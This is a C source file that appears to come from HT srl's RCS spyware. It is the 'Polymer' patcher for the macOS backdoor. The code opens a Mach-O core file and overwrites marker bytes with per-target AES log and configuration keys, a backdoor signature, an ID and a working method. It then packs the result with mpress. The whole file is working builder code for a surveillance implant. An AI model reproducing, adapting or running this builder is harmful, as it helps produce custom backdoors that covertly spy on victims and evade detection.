/*
 * RCSMac Polymer
 *  poly engine and binary patcher
 *
 * binary patcher created by Massimo Chiodini on 10/11/2009
 * refactored and fixed by Alfredo 'revenge' Pesoli on 17/11/2009
 *
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#include <openssl\md5.h>
#include <Windows.h>
#include <stdio.h>
#include <tchar.h>

#include "RCSMacPolymer.h"

//#define TEST_MODE


HANDLE hMachoFile;
HANDLE hMappedFile;

CHAR szBackdoorID[256];
CHAR szBackdoorSignature[256];
CHAR szLogKey[256];
CHAR szConfigurationKey[256];
CHAR szBackdoorName[256];
CHAR szWorkingMethod[32];
CHAR szFilename[MAX_PATH];
CHAR szOutFilename[MAX_PATH];

void
unloadMachO (BYTE *fileBase)
{
  if (fileBase != NULL)
    UnmapViewOfFile ((LPCVOID)fileBase);

  if (hMappedFile != INVALID_HANDLE_VALUE)
    CloseHandle (hMappedFile);

  if (hMachoFile != INVALID_HANDLE_VALUE)
    CloseHandle (hMachoFile);
}

LPVOID
loadMachO (char *fileName, unsigned int *len)
{
  if (fileName == NULL)
    {
      return NULL;
    }
  
  hMachoFile = CreateFileA (fileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
  if (hMachoFile == INVALID_HANDLE_VALUE)
    return NULL;

  *len = (unsigned int)GetFileSize (hMachoFile, NULL);

  hMappedFile = CreateFileMapping (hMachoFile, NULL, PAGE_READWRITE, NULL, *len, NULL);
  if (hMappedFile == INVALID_HANDLE_VALUE)
    {
      CloseHandle(hMachoFile);
      return NULL;
    }

  LPVOID fileBase = MapViewOfFile (hMappedFile, FILE_MAP_READ | FILE_MAP_WRITE, NULL, NULL, 0);
  if (fileBase == NULL)
    {
      CloseHandle(hMachoFile);
      CloseHandle(hMappedFile);

      return NULL;
    }

	return fileBase;
}

int
patchValue (BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len)
{
  BYTE *pDataSect	= NULL;
  int	 iRet = 0;

  pDataSect = pBlockPtr;

  if (pBlockPtr == NULL)
    return iRet;

  __try {
    while (pBlockPtr < (pDataSect + iLen))
      {
        if (!memcmp (pBlockPtr, mark_b, mark_len))
          break;
        else
          pBlockPtr++;
      }
	} __except (GetExceptionCode () == EXCEPTION_ACCESS_VIOLATION ) {
    printf("[ee] Exception in memcmp while");
		pBlockPtr = NULL;
	}

  if (pBlockPtr  && (pBlockPtr < (pDataSect + iLen - 1 )))
    {
      memset(pBlockPtr, 0, (int)mark_len);
      memcpy(pBlockPtr, block, (int)block_len);

      iRet = kSuccess;
    }
  else 
		iRet = kMarkError;

	return iRet;
}

int
patchMachoFile ()
{
  int				iRet = false;
  BYTE			*pBlockPtr	= NULL;
  BYTE			*pOutputPtr	= NULL;
  unsigned int	iLen = 0;
  
  // Loading mach-o file
  pBlockPtr = (BYTE *)loadMachO (szFilename, &iLen);

  BYTE md5Value[MD5_DIGEST_LENGTH];

  // Patching log aes key
  MD5((const UCHAR *)szLogKey, strlen(szLogKey), (PUCHAR)md5Value);

  if (patchValue (pBlockPtr,
                  iLen,
                  (BYTE *)md5Value,
                  16,
                  LOG_KEY_MARK,
                  AES_KEY_MARK_LEN) != kSuccess)
    {
      unloadMachO (pBlockPtr);
      return kPatchLogError;
    }
  
  printf("[x] Log key patched\n");

  // Patching configuration aes key
  MD5((const UCHAR *)szConfigurationKey, strlen(szConfigurationKey) , (PUCHAR)md5Value);
  if (patchValue (pBlockPtr,
                  iLen,
                  (BYTE *)md5Value,
                  16,
                  CONF_KEY_MARK,
                  AES_KEY_MARK_LEN) != kSuccess)
    {
      unloadMachO (pBlockPtr);
      return kPatchCnfError;
    }

  printf("[x] Configuration key patched\n");

	// Patching Backdoor signature
  //MD5((const UCHAR *)szBackdoorSignature, strlen(szBackdoorSignature) , (PUCHAR)md5Value);
	if (patchValue (pBlockPtr,
                  iLen,
                  (BYTE *)szBackdoorSignature,
                  SIGNATURE_MARK_LEN,
                  SIGNATURE_MARK,
                  SIGNATURE_MARK_LEN) != kSuccess)
    {
      unloadMachO (pBlockPtr);
      return kPatchComError;
    }

  printf("[x] Backdoor signature patched\n");

	// Patching backdoor ID
	szBackdoorID[16] = 0;
  if (patchValue (pBlockPtr,
                  iLen,
                  (BYTE *)szBackdoorID,
                  BACKDOOR_ID_LEN,
                  BACKDOOR_ID_MARK,
                  BACKDOOR_ID_LEN) != kSuccess)
    {
      unloadMachO (pBlockPtr);
      return kPatchBIdError;
    }

  printf("[x] Backdoor ID patched\n");
  
  if (patchValue (pBlockPtr,
                  iLen,
                  (BYTE *)szWorkingMethod,
                  WORKING_METHOD_LEN,
                  WORKING_METHOD_MARK,
                  WORKING_METHOD_LEN) != kSuccess)
    {
      unloadMachO (pBlockPtr);
      return kPatchFlcError;
    }

  printf("[x] Working Method patched\n");
  unloadMachO (pBlockPtr);

  if (CopyFile(szFilename, szOutFilename, FALSE) == 0)
    {
      printf("[ee] Error while generating the output file\n");
    }

  return kSuccess;
}

int
parseArguments (int argc, TCHAR **argv)
{
  if (argc != 8)
    {
      return kArgError;
    }

  _snprintf_s (szBackdoorID, sizeof(szBackdoorID), _TRUNCATE, "%s", argv[1]);
  _snprintf_s (szLogKey, sizeof(szLogKey), _TRUNCATE, "%s", argv[2]);
  _snprintf_s (szConfigurationKey, sizeof(szConfigurationKey), _TRUNCATE, "%s", argv[3]);
  _snprintf_s (szBackdoorSignature, sizeof(szBackdoorSignature), _TRUNCATE, "%s", argv[4]);
  _snprintf_s (szFilename, sizeof(szFilename), _TRUNCATE, "%s", argv[5]);
  _snprintf_s (szWorkingMethod, sizeof(szWorkingMethod), _TRUNCATE, "%s", argv[6]);
  _snprintf_s (szOutFilename, sizeof(szOutFilename), _TRUNCATE, "%s", argv[7]);
  
  //
  //  Sanity checks
  //
#ifndef TEST_MODE
  if (strlen(szBackdoorID) < strlen("RCS_0000000000"))
    {
      printf("[ee] Backdoor_id should be at least %d characters\n", strlen("RCS_0000000000"));
      return kArgError;
    }

  if (strlen(szLogKey) < AES_KEY_MARK_LEN)
    {
      printf("Log key should be at least %d characters\n", AES_KEY_MARK_LEN);
      return kArgError;
    }

  if (strlen(szConfigurationKey) < AES_KEY_MARK_LEN)
    {
      printf("Configuration Key should be at least %d characters\n", AES_KEY_MARK_LEN);
      return kArgError;
    }

  if (strlen(szBackdoorSignature) < SIGNATURE_MARK_LEN)
    {
      printf("Backdoor signature should be at least %d characters\n", SIGNATURE_MARK_LEN);
      return kArgError;
    }
#endif

  return kSuccess;
}

void
usage (TCHAR *aBinaryName)
{
  printf ("\nUsage: %S <bid> <log_key> <conf_key> <bsignature> <core_file>\n\n", aBinaryName);
  printf ("\t<bid>          : backdoor id\n");
  printf ("\t<log_key>      : aes log key\n");
  printf ("\t<conf_key>     : aes conf key\n");
  printf ("\t<bsignature>   : backdoor signature\n");
  printf ("\t<core_file>    : core file name path\n");
  printf ("\t<method>       : backdoor working method\n");
  printf ("\t<output_file>  : output file name path\n\n");
}

int main (int argc, TCHAR *argv[])
{
  int iRet = -1;

  if (parseArguments (argc, argv) != kSuccess)
    {
      usage (*argv);
      exit (kArgError);
    }

  if ((iRet = patchMachoFile()) == kSuccess)
    {
      CHAR params[64];
      CHAR backupName[64];

      PROCESS_INFORMATION pi;
      STARTUPINFOA si;
      HANDLE tmpHandle;

      ZeroMemory(&si, sizeof(si));
      ZeroMemory(&pi, sizeof(pi));
      si.cb = sizeof(si);
      
      sprintf_s (params, sizeof(params), "mpress.exe -ub %s", szOutFilename);
      if (CreateProcessA(NULL, params, 0, 0, FALSE, CREATE_DEFAULT_ERROR_MODE, 0, 0, &si, &pi) == TRUE)
        {
          printf("mpress ok\n");
          WaitForSingleObject(pi.hProcess, INFINITE);

          CloseHandle(pi.hProcess);
          CloseHandle(pi.hThread);
        }
      else
        {
          printf("mpress failed\n");
        }

      sprintf_s (backupName, sizeof(backupName), "%s.bak", szOutFilename);

      if ((tmpHandle = CreateFileA(backupName, GENERIC_READ, FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
        {
          DeleteFileA(backupName);
          printf("\n[ii] File patched correctly\n\n");
        }
      else
        {
          DeleteFileA(szOutFilename);
          printf("\n[ii] An error occurred while patching the file (last step)\n\n");
        }

      CloseHandle(tmpHandle);
    }
  else
    {
      printf("\n[ee] An error occurred while patching the core file\n\n");
    }

  return iRet;
}